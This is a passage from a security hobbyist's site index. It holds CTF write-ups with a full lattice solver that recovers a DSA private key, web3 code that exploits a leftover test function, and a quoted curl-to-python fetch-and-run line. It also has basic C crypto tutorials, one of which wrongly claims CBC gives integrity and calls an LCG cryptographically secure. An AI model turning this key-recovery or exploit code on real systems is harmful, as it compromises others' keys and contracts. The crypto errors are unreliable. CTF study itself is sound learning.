q, 1, 0, 0], [-(A_12 + a*A_01) mod q, 0, 1, 0], [A_01 mod q, 0, 0, 1] ] Using LLL reduction and CVP (Closest Vector Problem) with Babai\u0026rsquo;s algorithm, we find the vector closest to (target, 0, 0, 0), which gives us (target, u_0, u_1, u_2).\nStep 4: Recover the Private Key # Once we have the hidden bits u_0, u_1, u_2, we can compute:\nx = (C_01 + a*u_0 - u_1) * A_01^(-1) (mod q) Step 5: Decrypt the Flag # The flag is encrypted with AES-CBC using a key derived from the private key:\nkey = SHA256(str(x)) Solution # Complete Solver Script # # Rng CTF Challenge Solver import hashlib # Parse the output file with open(\u0026#34;out.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: lines = f.read().strip().split(\u0026#39;\\n\u0026#39;) # Extract public parameters p = Integer(lines[1].split(\u0026#39; = \u0026#39;)[1]) q = Integer(lines[2].split(\u0026#39; = \u0026#39;)[1]) g = Integer(lines[3].split(\u0026#39; = \u0026#39;)[1]) y = Integer(lines[4].split(\u0026#39; = \u0026#39;)[1]) a = Integer(lines[5].split(\u0026#39; = \u0026#39;)[1]) # LCG parameter b = Integer(lines[6].split(\u0026#39; = \u0026#39;)[1]) # LCG parameter # Extract signatures (remember: 0-indexed) r1 = Integer(lines[10].split(\u0026#39;: \u0026#39;)[1]) s1 = Integer(lines[11].split(\u0026#39;: \u0026#39;)[1]) r2 = Integer(lines[14].split(\u0026#39;: \u0026#39;)[1]) s2 = Integer(lines[15].split(\u0026#39;: \u0026#39;)[1]) r3 = Integer(lines[18].split(\u0026#39;: \u0026#39;)[1]) s3 = Integer(lines[19].split(\u0026#39;: \u0026#39;)[1]) # Compute message hashes msgs = [b\u0026#34;Welcome to the challenge\u0026#34;, b\u0026#34;This is a signed message\u0026#34;, b\u0026#34;Hope U can Solve this\u0026#34;] h1 = Integer(int(hashlib.sha1(msgs[0]).hexdigest(), 16)) h2 = Integer(int(hashlib.sha1(msgs[1]).hexdigest(), 16)) h3 = Integer(int(hashlib.sha1(msgs[2]).hexdigest(), 16)) signatures = [(h1, r1, s1), (h2, r2, s2), (h3, r3, s3)] print(\u0026#34;=== LCG-DSA Attack ===\\n\u0026#34;) hidden_bits = 32 B = 2^hidden_bits # B = 2^32 n = 3 # Number of signatures h0, r0, s0 = signatures[0] h1, r1, s1 = signatures[1] h2, r2, s2 = signatures[2] # Compute modular inverses of signature values s0_inv = inverse_mod(s0, q) s1_inv = inverse_mod(s1, q) s2_inv = inverse_mod(s2, q) # Compute coefficients A and C for the linear system # For signatures 0-1: A_01 = (r1*s1_inv*B - a*r0*s0_inv*B) % q C_01 = (a*h0*s0_inv*B - h1*s1_inv*B + b) % q # For signatures 1-2: A_12 = (r2*s2_inv*B - a*r1*s1_inv*B) % q C_12 = (a*h1*s1_inv*B - h2*s2_inv*B + b) % q # Compute the target value for our lattice attack target = (C_12*A_01 - C_01*A_12) % q print(f\u0026#34;Target value: {target}\u0026#34;) print(f\u0026#34;Setting up lattice to solve for hidden bits...\\n\u0026#34;) # Build a 4x4 lattice to solve for (u_0, u_1, u_2) # We need: a*u_0*A_12 - u_1*(A_12 + a*A_01) + u_2*A_01 ‚â° target (mod q) dim = 4 L = Matrix(ZZ, dim, dim) L[0, 0] = q L[1, 0] = (a * A_12) % q L[1, 1] = 1 L[2, 0] = (-(A_12 + a*A_01)) % q L[2, 2] = 1 L[3, 0] = A_01 % q L[3, 3] = 1 # Apply LLL reduction print(\u0026#34;Applying LLL reduction...\u0026#34;) L_LLL = L.LLL() print(\u0026#34;LLL complete!\\n\u0026#34;) # Babai\u0026#39;s nearest plane algorithm for CVP def babai(L_LLL, target): \u0026#34;\u0026#34;\u0026#34;Find the closest lattice vector to target using Babai\u0026#39;s algorithm\u0026#34;\u0026#34;\u0026#34; G = L_LLL.gram_schmidt()[0] t_cur = target coeffs = [] for i in range(L_LLL.nrows()-1, -1, -1): c = (t_cur * G[i]) / (G[i] * G[i]) c = round(c) coeffs.insert(0, c) t_cur = t_cur - c * L_LLL[i] v = sum(coeffs[i] * L_LLL[i] for i in range(L_LLL.nrows())) return v # Solve CVP t = vector(ZZ, [target, 0, 0, 0]) closest = babai(L_LLL, t) print(f\u0026#34;Closest vector found: {closest}\\n\u0026#34;) # Extract the hidden bits from the solution u_0 = abs(closest[1]) u_1 = abs(closest[2]) u_2 = abs(closest[3]) print(f\u0026#34;Recovered hidden bits:\u0026#34;) print(f\u0026#34; u_0 = {u_0}\u0026#34;) print(f\u0026#34; u_1 = {u_1}\u0026#34;) print(f\u0026#34; u_2 = {u_2}\u0026#34;) # Verify they\u0026#39;re in valid range (\u0026lt; 2^32) if u_0 \u0026lt; B and u_1 \u0026lt; B and u_2 \u0026lt; B: print(\u0026#34;‚úì Hidden bits are valid!\\n\u0026#34;) # Compute the private key x delta_01 = (a*u_0 - u_1) % q x = ((C_01 + delta_01) * inverse_mod(A_01, q)) % q # Verify with the second equation delta_12 = (a*u_1 - u_2) % q x_check = ((C_12 + delta_12) * inverse_mod(A_12, q)) % q if x == x_check: print(\u0026#34;‚úì Private key verified with both equations!\u0026#34;) # Final verification: check all signatures and LCG relations print(\u0026#34;\\nVerifying all signatures and LCG relations...\u0026#34;) k_0 = ((h0 + x*r0) * inverse_mod(s0, q)) % q k_1 = ((h1 + x*r1) * inverse_mod(s1, q)) % q k_2 = ((h2 + x*r2) * inverse_mod(s2, q)) % q state_0 = k_0*B + u_0 state_1 = k_1*B + u_1 state_2 = k_2*B + u_2 # Check LCG relations lcg_check_1 = (a*state_0 + b) % q == state_1 lcg_check_2 = (a*state_1 + b) % q == state_2 if lcg_check_1 and lcg_check_2: print(\u0026#34;‚úì All LCG relations verified!\u0026#34;) print(\u0026#34;\\n\u0026#34; + \u0026#34;=\u0026#34;*50) print(\u0026#34;SUCCESS!\u0026#34;) print(\u0026#34;=\u0026#34;*50) print(f\u0026#34;\\nPrivate key (x): {x}\\n\u0026#34;) # Save the private key with open(\u0026#34;private_key.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(str(x)) print(\u0026#34;Private key saved to private_key.txt\u0026#34;) else: print(\u0026#34;‚úó LCG verification failed\u0026#34;) else: print(\u0026#34;‚úó Private key verification failed\u0026#34;) else: print(\u0026#34;‚úó Hidden bits out of valid range\u0026#34;) Decryption Script # # decrypt_flag.py import hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # Read the recovered private key with open(\u0026#34;private_key.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: x = int(f.read().strip()) # Parse the encrypted flag from output file with open(\u0026#34;out.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: lines = f.read().strip().split(\u0026#39;\\n\u0026#39;) iv = bytes.fromhex(lines[22].split(\u0026#39; = \u0026#39;)[1]) ciphertext = bytes.fromhex(lines[23].split(\u0026#39; = \u0026#39;)[1]) # Derive the AES key from the private key key = hashlib.sha256(str(x).encode()).digest() # Decrypt the flag cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(ciphertext), 16) print(f\u0026#34;Flag: {plaintext.decode()}\u0026#34;) Running the Solution # # Run the Sage solver to recover the private key sage solve_final.sage # Decrypt the flag using the recovered key python3 decrypt_flag.py Flag # Cybears{lil_bit_truncated_lil_bit_signature_and_thats_the_flag} Key Takeaways # Never use predictable RNGs for cryptographic nonces: Even with a cryptographically secure LCG, truncating the output leaks information.\nBit truncation is dangerous: Discarding the lower 32 bits of a 160-bit value creates a Hidden Number Problem that can be solved with lattice techniques.\nLattice attacks are powerful: When you have linear equations with small unknowns over a modulus, lattice reduction (LLL) combined with CVP solving can recover those unknowns.\nDSA requires truly random nonces: Any bias, predictability, or partial information leakage in DSA nonces can lead to complete private key recovery.\nReferences # The Hidden Number Problem Lattice Attacks on DSA Schemes Recovering Cryptographic Keys from Partial Information LLL Algorithm ","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/rng/","section":"Writeups","summary":"","title":"Rng - CTF Writeup","type":"writeups"},{"content":"Challenge Name: ZERO ZERO-Knowledge\nCategory: Blockchain\nCTF: ClawTheFlag\nDifficulty: Hard\nDescription: Zero description.\nConnection: nc 13.61.1.167 31338\nInitial Reconnaissance # The challenge provides minimal information - just a netcat connection. Let\u0026rsquo;s start by probing the service:\nnc 13.61.1.167 31338 Output:\n1 - launch new instance 2 - kill instance 3 - get flag (if isSolved() is true) action? The service presents a menu with three options. Attempting option 1 triggers a Proof-of-Work challenge:\n== PoW == sha256(\u0026#34;7a39c8374cbb964e\u0026#34; + YOUR_INPUT) must start with 24 zeros in binary representation please run the following command to solve it: python3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) 7a39c8374cbb964e 24 This is a computational puzzle requiring us to find an input such that SHA256(nonce + input) produces a hash with 24 leading zero bits.\nUnderstanding the Service # The PoW serves as anti-spam protection. After solving it, the service proceeds with option 1:\nAfter solving PoW:\ndeploying your private blockchain... your private blockchain has been deployed it will automatically terminate in 30 minutes here\u0026#39;s some useful information uuid: 3f47d741-8ed5-483a-8dac-84cd538ddfd1 rpc endpoint: http://13.61.1.167:8546/3f47d741-8ed5-483a-8dac-84cd538ddfd1 private key: 0x54daf2395064a19fc4303b78e2d70f63fd8d8f11601fa05f786ee22fd6d21259 your address: 0x17Dff1Bd81CD02CC010948371a160Bd4EBC83B3d Excellent! The service:\nSpins up a private Ethereum blockchain (likely using Anvil/Hardhat) Provides us with: A unique UUID for our instance An HTTP RPC endpoint A funded private key Our Ethereum address The instance auto-terminates after 30 minutes, so we need to work efficiently.\nDeploying a Private Instance # To solve the PoW quickly, I implemented a Python brute-force solver:\ndef solve_pow(nonce: str, bits: int) -\u0026gt; str: i = 0 while True: candidate = str(i).encode() digest_hex = hashlib.sha256(nonce.encode() + candidate).hexdigest() if has_leading_zero_bits(digest_hex, bits): return candidate.decode() i += 1 def has_leading_zero_bits(hex_digest: str, bits: int) -\u0026gt; bool: bin_str = bin(int(hex_digest, 16))[2:].zfill(256) return bin_str.startswith(\u0026#34;0\u0026#34; * bits) With 24 bits of difficulty, this takes 2-50 seconds on average (expected ~16.7 million attempts).\nBlockchain Analysis # Once we have the RPC endpoint, let\u0026rsquo;s connect using Web3.py and explore:\nfrom web3 import Web3 w3 = Web3(Web3.HTTPProvider(rpc_url)) print(f\u0026#34;Chain ID: {w3.eth.chain_id}\u0026#34;) print(f\u0026#34;Latest block: {w3.eth.block_number}\u0026#34;) Result:\nChain ID: 31337 (standard Anvil/Hardhat test chain) Latest block: 3 Finding Deployed Contracts # The challenge must have deployed a contract. Let\u0026rsquo;s scan the blockchain:\ncontracts = [] for block_num in range(0, w3.eth.block_number + 1): block = w3.eth.get_block(block_num, full_transactions=True) for tx in block.transactions: receipt = w3.eth.get_transaction_receipt(tx.hash) if receipt.contractAddress: contracts.append(receipt.contractAddress) Found: One contract at 0xaE9F52994C6C60B63fE9f81a55a29b01cD59b6E9\nContract Reverse Engineering # Without the source code or ABI, we need to reverse-engineer the contract. Let\u0026rsquo;s extract function selectors from the bytecode:\ndef extract_selectors(bytecode: bytes) -\u0026gt; list: sels = [] i = 0 while i \u0026lt; len(bytecode): op = bytecode[i] i += 1 if op == 0x63 and i + 4 \u0026lt;= len(bytecode): # PUSH4 opcode selector = bytecode[i:i+4].hex() sels.append(selector) i += 4 elif 0x60 \u0026lt;= op \u0026lt;= 0x7f: # PUSH1-PUSH32 push_len = op - 0x5f i += push_len return list(dict.fromkeys(sels)) Extracted selectors:\n0x799320bb, 0x8da5cb5b, 0x98b0eff6, 0xafe42d92, 0xf8544bbd, 0x13416ae1, 0x19c813be, 0x36091dff, 0x64d98f6e, 0x43753b4d, 0xffffffff Identifying Functions with 4byte.directory # Using the 4byte.directory API to lookup selectors:\nSelector Function Signature 0x64d98f6e isSolved() 0x799320bb solved() 0x8da5cb5b owner() 0x43753b4d verifyProof(uint256[2],uint256[2][2],uint256[2],uint256[1]) 0x13416ae1 sanityCheck(uint256[2],uint256[2][2],uint256[2],uint256[1]) 0xafe42d92 solveMe(uint256[2],uint256[2][2],uint256[2],uint256[1],bytes32) 0x36091dff test(bool) Analysis:\nisSolved() / solved() - Check if challenge is solved verifyProof() / sanityCheck() - zk-SNARK proof verification (Groth16) solveMe() - Likely the intended solution requiring a valid proof test(bool) - Suspicious! A test function left in production code? The presence of Groth16 proof verification functions aligns with the challenge name \u0026ldquo;ZERO ZERO-Knowledge\u0026rdquo; - referencing zero-knowledge proofs.\nFinding the Vulnerability # Let\u0026rsquo;s test isSolved() first:\nisSolved_selector = Web3.keccak(text=\u0026#34;isSolved()\u0026#34;)[:4].hex() result = w3.eth.call({ \u0026#34;to\u0026#34;: contract_address, \u0026#34;data\u0026#34;: \u0026#34;0x\u0026#34; + isSolved_selector }) solved = bool(int.from_bytes(result, byteorder=\u0026#34;big\u0026#34;)) print(f\u0026#34;Currently solved: {solved}\u0026#34;) # False The challenge expects us to generate a valid Groth16 zero-knowledge proof. However, creating such proofs requires:\nThe circuit definition Trusted setup parameters Valid witnesses Significant cryptographic knowledge But wait\u0026hellip; what about that test(bool) function? ü§î\nLet\u0026rsquo;s try calling it with true:\nfrom eth_account import Account acct = Account.from_key(private_key) nonce = w3.eth.get_transaction_count(acct.address) # Call test(true) test_selector = Web3.keccak(text=\u0026#34;test(bool)\u0026#34;)[:4].hex() calldata = bytes.fromhex(test_selector) + b\u0026#34;\\x00\u0026#34; * 31 + b\u0026#34;\\x01\u0026#34; # bool true tx = { \u0026#34;to\u0026#34;: contract_address, \u0026#34;data\u0026#34;: calldata, \u0026#34;nonce\u0026#34;: nonce, \u0026#34;chainId\u0026#34;: 31337, \u0026#34;gasPrice\u0026#34;: w3.eth.gas_price, \u0026#34;gas\u0026#34;: 250000, } signed = acct.sign_transaction(tx) tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction) receipt = w3.eth.wait_for_transaction_receipt(tx_hash) print(f\u0026#34;Transaction status: {receipt.status}\u0026#34;) # 1 (success!) Checking again:\nresult = w3.eth.call({\u0026#34;to\u0026#34;: contract_address, \u0026#34;data\u0026#34;: \u0026#34;0x64d98f6e\u0026#34;}) solved = bool(int.from_bytes(result, byteorder=\u0026#34;big\u0026#34;)) print(f\u0026#34;Solved: {solved}\u0026#34;) # True! üéâ Exploitation # The vulnerability is simple: the contract has a debug/test function that directly sets the solved state!\nThis is a common mistake in smart contract development - leaving test/debug functions accessible in production deployments. The developers likely intended to require a valid Groth16 proof via solveMe(), but forgot to remove or properly protect the test() function.\nExploitation steps:\nSolve PoW Launch instance and get RPC credentials Connect to blockchain Find the challenge contract Call test(true) to flip the solved flag Retrieve the flag via menu option 3 Getting the Flag # After setting isSolved() = true, we reconnect to the service and use option 3:\nnc 13.61.1.167 31338 Flow:\nSolve the PoW again Select option 3 Provide the UUID from our instance Solve another PoW Receive the flag! Output:\nCongratulations! You have solved it! Here\u0026#39;s the flag: cybears{groth16_iS_M4LLE4bL3_4s_w3LL} The flag message \u0026ldquo;groth16_iS_M4LLE4bL3_4s_w3LL\u0026rdquo; is a play on:\nGroth16 - The zk-SNARK proving system Malleable - A cryptographic property where proofs can be modified Automated Solution # I created a full automated solver that:\nHandles both PoW challenges Discovers contracts automatically Tests all function selectors systematically Retrieves the flag Full solution: client.py\nRun it:\npython3 client.py The script completes in ~30-90 seconds depending on PoW luck.\nKey Takeaways # What We Learned # Smart Contract Security:\nAlways remove debug/test functions before deployment Use access control modifiers (onlyOwner, etc.) Conduct thorough audits of public functions Blockchain CTF Techniques:\nBytecode analysis to extract function selectors Using 4byte.directory for reverse engineering Automated contract discovery via transaction receipts Systematic function testing when ABI is unavailable Zero-Knowledge Proofs:\nGroth16 is a popular zk-SNARK construction Proof systems have complex verification logic The challenge name was a hint about the intended solution path But the actual solution bypassed the crypto entirely! Tools Used # Python 3 with web3.py and eth_account 4byte.directory - Function signature database netcat - Initial service exploration Keccak hashing - Function selector computation References # Groth16 Paper 4byte Directory Web3.py Documentation Ethereum Yellow Paper ","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/zero-zero-knowledge/","section":"Writeups","summary":"","title":"ZERO ZERO-Knowledge - CTF Writeup","type":"writeups"},{"content":"Highlights of awards, milestones, and recognitions in cybersecurity and programming.\n","date":"10 November 2025","externalUrl":null,"permalink":"/achievements/","section":"Achievements","summary":"","title":"Achievements","type":"achievements"},{"content":"","date":"10 November 2025","externalUrl":null,"permalink":"/categories/participation/","section":"Categories","summary":"","title":"Participation","type":"categories"},{"content":"üöÄ Proud to Announce Our Victory at the INSIGHT Hackathon 2025!\nI‚Äôm incredibly proud to share that my team Cteam and I won the INSIGHT Hackathon 2025, a 24-hour cybersecurity and innovation challenge organized by IEEE SB ESPRIM.\nThis event was an intense mix of problem-solving, creativity, and teamwork ‚Äî and pushing through every stage with my teammates made this achievement even more meaningful.\nüí° We built a solution that combined technical depth, fast decision-making, and a lot of resilience.\nü§ù Huge respect to all the participating teams for their impressive projects.\nüôå And a special thanks to the organizing team for an amazing event full of energy and inspiration.\nThis experience reinforced my passion for cybersecurity and collaborative innovation.\n","date":"10 November 2025","externalUrl":null,"permalink":"/achievements/insight-hackthon/","section":"Achievements","summary":"","title":"Victory at the INSIGHT Hackathon 2025","type":"achievements"},{"content":"","date":"23 September 2025","externalUrl":null,"permalink":"/categories/position/","section":"Categories","summary":"","title":"Position","type":"categories"},{"content":"I‚Äôm happy to share that I‚Äôve held a dual role at Pwn \u0026amp; Patch, working as both a Ruby on Rails developer and a Cyber Security intern. During this experience, I contributed to secure application development, vulnerability assessment, and hands-on debugging while strengthening my skills across backend engineering and offensive security practices.\n","date":"23 September 2025","externalUrl":null,"permalink":"/achievements/pwn-and-patch-internship/","section":"Achievements","summary":"","title":"Pwn \u0026 Patch Internship","type":"achievements"},{"content":"","date":"23 September 2025","externalUrl":null,"permalink":"/tags/ruby-on-rails/","section":"Tags","summary":"","title":"Ruby on Rails","type":"tags"},{"content":"üéâ I\u0026rsquo;m excited to share that I‚Äôve officially earned my CCNA (Cisco Certified Network Associate) certification! üèÖ Looking forward to applying this knowledge and growing further in the field of IT and networking. üöÄ\nYou can view or visit link below:\nVisit link\n","date":"20 May 2025","externalUrl":null,"permalink":"/achievements/ccna-introduction-to-networks/","section":"Achievements","summary":"","title":"CCNA: Introduction to Networks","type":"achievements"},{"content":"","date":"20 May 2025","externalUrl":null,"permalink":"/categories/certificate/","section":"Categories","summary":"","title":"Certificate","type":"categories"},{"content":"","date":"20 May 2025","externalUrl":null,"permalink":"/tags/network/","section":"Tags","summary":"","title":"Network","type":"tags"},{"content":"My space for thoughts, tutorials, and insights on programming and cybersecurity.\n","date":"28 February 2025","externalUrl":null,"permalink":"/blog/","section":"Blog","summary":"","title":"Blog","type":"blog"},{"content":"","date":"28 February 2025","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"Exploring encryption, ciphers, and real-world cryptography challenges.\n","date":"28 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/","section":"Blog","summary":"","title":"Cryptography","type":"blog"},{"content":"Tips, guides, and deep dives into the world of digital security.\n","date":"28 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/","section":"Blog","summary":"","title":"Cybersecurity","type":"blog"},{"content":" Introduction # In today‚Äôs digital world, protecting sensitive data is more important than ever. One of the most popular methods for secure communication is RSA encryption, a public-key cryptosystem that allows secure data exchange without sharing a secret key beforehand. In this blog, we‚Äôll break down how RSA works in an easy-to-understand way and demonstrate its use in C with practical code examples.\nWhat Is RSA Encryption? # RSA encryption is based on a pair of keys ‚Äî a public keyand a private key:\nPublic Key: Used to encrypt messages. It can be freely shared. Private Key: Used to decrypt messages. It must be kept secret. The beauty of RSA lies in its asymmetric nature: anyone can encrypt a message using the public key, but only the holder of the private key can decrypt it. This makes RSA ideal for scenarios where secure key exchange is challenging.\nHow Does RSA Work? # RSA relies on mathematical properties of large prime numbers:\nKey Generation: Two large prime numbers are chosen and multiplied together to create a modulus. The public and private keys are derived from this modulus and another number called the public exponent.\nEncryption: The sender uses the recipient‚Äôs public key to encrypt the message, transforming it into an unreadable format.\nDecryption: The recipient uses their private key to convert the ciphertext back into the original message.\nThis process ensures that even if someone intercepts the encrypted data, they cannot decipher it without the private key.\nUnderstanding the Mathematics Behind RSA Key Generation # RSA encryption is built upon fundamental principles of number theory. Here‚Äôs a simplified look at the math that underpins RSA:\nKey Generation # Two large prime numbers, p and q, are chosen and multiplied together to form the modulus:\nn=p√óq The totient of n is calculated as: œï(n)=(p‚àí1)√ó(q‚àí1)\nPublic and Private Keys # The public key is made up of (n, e), where e is a public exponent (often chosen as 65537 for efficiency and security). The private key is a number d that satisfies the following equation:\ne√ód‚â°1 mod œï(n)\nIn other words, d is the modular inverse of e modulo œï(n).\nThe Challenge of Deriving the Private Key # To calculate d, one must know œï(n), which in turn requires knowing the prime factors p and q of n. For sufficiently large primes, factoring n into p and q is computationally infeasible with current technology. This is why, despite knowing n and e (the public key), it is practically impossible to derive d (the private key) without breaking the underlying hard problem of integer factorization.\nExtended Euclidean Algorithm # In theory, if you could factor n and determine œï(n), you would use the Extended Euclidean Algorithm to compute d as the modular inverse of e modulo œï(n):\nd=e^{‚àí1}mod√óœï(n)\nWhy You Can‚Äôt Derive the Private Key from the Public Key # In RSA, the public key is made up of a large number and an exponent, while the private key is mathematically linked to these values. However, obtaining the private key from the public key requires figuring out two secret prime numbers that were used to generate the large number. This process, known as factoring, is extremely difficult and practically impossible with current technology. As a result, even though the public key is shared openly, the private key remains secure.\nImplementing RSA Encryption in C # Below is a practical example demonstrating how to generate RSA keys in memory, encrypt a message using the public key, and then decrypt it using the private key. We use OpenSSL libraries to simplify cryptographic operations.\nRSA Encryption \u0026amp; Decryption Code Example\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/rsa.h\u0026gt; #include \u0026lt;openssl/pem.h\u0026gt; #include \u0026lt;openssl/err.h\u0026gt; int main() { int ret = 0; RSA *rsa = NULL; BIGNUM *bn = NULL; unsigned char *encrypted = NULL; unsigned char *decrypted = NULL; int encrypted_length, decrypted_length; // Step 1: Generate RSA Keys bn = BN_new(); BN_set_word(bn, RSA_F4); // RSA_F4 == 0x10001 rsa = RSA_new(); if (RSA_generate_key_ex(rsa, 2048, bn, NULL) != 1) { ERR_print_errors_fp(stderr); return 1; } // Step 2: Define the message to encrypt unsigned char message[] = \u0026#34;Hello RSA Encryption!\u0026#34;; int message_len = strlen((char *)message) + 1; // include null terminator // Allocate memory for encrypted and decrypted data int rsa_size = RSA_size(rsa); encrypted = malloc(rsa_size); decrypted = malloc(rsa_size); // Step 3: Encrypt the message using the public key encrypted_length = RSA_public_encrypt(message_len, message, encrypted, rsa, RSA_PKCS1_OAEP_PADDING); if(encrypted_length == -1) { ERR_print_errors_fp(stderr); return 1; } printf(\u0026#34;Encrypted message (in hex):\\n\u0026#34;); for (int i = 0; i \u0026lt; encrypted_length; i++) { printf(\u0026#34;%02x\u0026#34;, encrypted[i]); } printf(\u0026#34;\\n\\n\u0026#34;); // Step 4: Decrypt the message using the private key decrypted_length = RSA_private_decrypt(encrypted_length, encrypted, decrypted, rsa, RSA_PKCS1_OAEP_PADDING); if(decrypted_length == -1) { ERR_print_errors_fp(stderr); return 1; } printf(\u0026#34;Decrypted message: %s\\n\u0026#34;, decrypted); // Cleanup: Free allocated resources RSA_free(rsa); BN_free(bn); free(encrypted); free(decrypted); return 0; } Explanation of the Code:\nKey Generation: We generate a 2048-bit RSA key pair using RSA_generate_key_ex(). A BIGNUM (bn) is used to set the public exponent, commonly set to RSA_F4.\nEncryption: The RSA_public_encrypt() function encrypts the plaintext message using the public key. We use RSA_PKCS1_OAEP_PADDING to ensure robust security through proper padding.\nDecryption: The RSA_private_decrypt() function decrypts the ciphertext back into plaintext using the private key and the same padding scheme.\nOutput: The encrypted message is displayed in hexadecimal format, and the decrypted message is printed as a string.\nApplications of RSA Encryption # RSA encryption is widely used in:\nSecure Communications: Establishing secure connections over the Internet (e.g., SSL/TLS). Digital Signatures: Verifying the authenticity and integrity of digital messages. Key Exchange: Securely exchanging keys for symmetric encryption algorithms. Its role in ensuring that data remains confidential and authentic makes RSA an essential tool in modern cybersecurity.\nFinal Thoughts # RSA encryption simplifies secure communication by eliminating the need to share private keys. With its robust mathematical foundation, RSA continues to be a cornerstone in protecting sensitive data. By leveraging libraries like OpenSSL, you can integrate RSA encryption into your C applications with ease.\n","date":"28 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/understanding-rsa-encryption/","section":"Blog","summary":"","title":"Understanding RSA Encryption: A Simple Guide Using C","type":"blog"},{"content":" Introduction # In today‚Äôs interconnected digital landscape, ensuring that a message has not been tampered with during transmission is just as important as keeping its contents confidential. One of the most effective tools for verifying message integrity and authenticity is HMAC (Hash-based Message Authentication Code). In this blog post, we‚Äôll explore what HMAC is, why it matters, and how you can integrate it into your C applications using practical code examples.\nWhat Is HMAC? # HMAC is a mechanism for message authentication that uses cryptographic hash functions (such as SHA-256) along with a secret key. It produces a fixed-size output (the MAC) that is unique to both the message and the key. This signature helps recipients verify that the message hasn‚Äôt been altered and confirms the sender‚Äôs identity.\nKey aspects of HMAC include:\nMessage Integrity: Even a small change in the message results in a drastically different HMAC. Authentication: Only someone with the secret key can generate or verify the correct HMAC. Flexibility: It can work with various cryptographic hash functions, offering a balance between performance and security. Integrating HMAC in C # To integrate HMAC into your C programs, you can use the OpenSSL library, which provides robust cryptographic functions. Below is a simple example demonstrating how to compute an HMAC using the SHA-256 hash function.\nHMAC in C: Code Example\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/hmac.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; int main() { // Define a secret key and a message const char *key = \u0026#34;supersecretkey\u0026#34;; const char *message = \u0026#34;This is a test message for HMAC\u0026#34;; // Buffer for the HMAC digest unsigned char digest[EVP_MAX_MD_SIZE]; unsigned int digest_len = 0; // Compute the HMAC using SHA-256 HMAC(EVP_sha256(), key, strlen(key), (unsigned char*)message, strlen(message), digest, \u0026amp;digest_len); // Print the resulting HMAC in hexadecimal format printf(\u0026#34;HMAC (SHA-256): \u0026#34;); for (unsigned int i = 0; i \u0026lt; digest_len; i++) { printf(\u0026#34;%02x\u0026#34;, digest[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; } Explanation of the Code: # Key \u0026amp; Message: The secret key and the message are defined as strings. Digest Buffer: A buffer is allocated to hold the HMAC result. EVP_MAX_MD_SIZE is used to ensure the buffer is large enough for any supported hash function. HMAC Calculation: The **HMAC( )**function from OpenSSL computes the HMAC using the SHA-256 hash algorithm. The result is stored in digest, and its length is updated in digest_len. Output: The resulting HMAC is printed in a hexadecimal format. How HMAC Enhances Message Integrity # HMAC ensures that:\nIntegrity Check: The recipient computes the HMAC over the received message using the same secret key. A mismatch indicates tampering. Authentication: Only someone with the secret key can produce a valid HMAC, thereby authenticating the sender. These properties make HMAC invaluable in secure communications, file transfers, and API request validations.\nBest Practices for Using HMAC # Secure Key Management: Always protect and manage your secret keys securely. Use Strong Hash Functions: SHA-256 or higher is recommended over older algorithms like MD5. Combine with Encryption: While HMAC verifies integrity, combining it with encryption ensures both confidentiality and integrity. Validate on Both Ends: Always verify the HMAC on the receiving end to detect any data corruption or tampering. Final Thoughts # Integrating HMAC for message integrity is a powerful addition to your security toolkit. It not only confirms that the message hasn‚Äôt been altered during transit but also authenticates its origin. By leveraging libraries like OpenSSL in your C applications, you can implement HMAC quickly and effectively, bolstering the security of your communications.\nWould you like to explore more advanced implementations, such as combining HMAC with encryption or error handling improvements in C? Feel free to reach out for further discussion!\n","date":"17 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/integrating-hmac/","section":"Blog","summary":"","title":"Securing Your Messages: Integrating HMAC for Message Integrity in C","type":"blog"},{"content":" Introduction # When it comes to protecting sensitive data, encryption plays a crucial role in modern security systems. One of the most popular modes of AES (Advanced Encryption Standard) is the CBC (Cipher Block Chaining) mode. In this blog, we‚Äôll explore how CBC works, why it‚Äôs essential, and how to implement it using C with practical code examples.\nWhat Is AES CBC Mode? # AES in Cipher Block Chaining (CBC) mode encrypts blocks of data by chaining them together. Each block of plaintext is XORed with the previous ciphertext block before being encrypted.\nThis process ensures that identical plaintext blocks produce different ciphertext blocks, enhancing security.\nKey Elements of CBC Mode:\nInitialization Vector (IV): A random block used for the first encryption step.\nChaining: Each encrypted block depends on the previous ciphertext block.\nWhy Use CBC Mode? # CBC mode offers several advantages:\nIncreased Security: Reduces the risk of pattern detection. Integrity Protection: Chaining ensures even small changes in plaintext affect multiple ciphertext blocks. However, it requires the same IV and key for decryption, which adds complexity to key management.\nAES Encryption in CBC Mode # (C Code Example)\nHere‚Äôs a simple implementation using OpenSSL‚Äôs AES functions:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/aes.h\u0026gt; #include \u0026lt;openssl/rand.h\u0026gt; void encryptAES_CBC(const unsigned char *plaintext, unsigned char *ciphertext, const unsigned char *key, unsigned char *iv) { AES_KEY encryptKey; AES_set_encrypt_key(key, 128, \u0026amp;encryptKey); AES_cbc_encrypt(plaintext, ciphertext, strlen((const char *)plaintext), \u0026amp;encryptKey, iv, AES_ENCRYPT); } int main() { unsigned char key[16] = \u0026#34;mysecurekey12345\u0026#34;; unsigned char iv[AES_BLOCK_SIZE]; unsigned char plaintext[32] = \u0026#34;SensitiveDataForEncryption\u0026#34;; unsigned char ciphertext[32]; // Generate a random IV if (!RAND_bytes(iv, 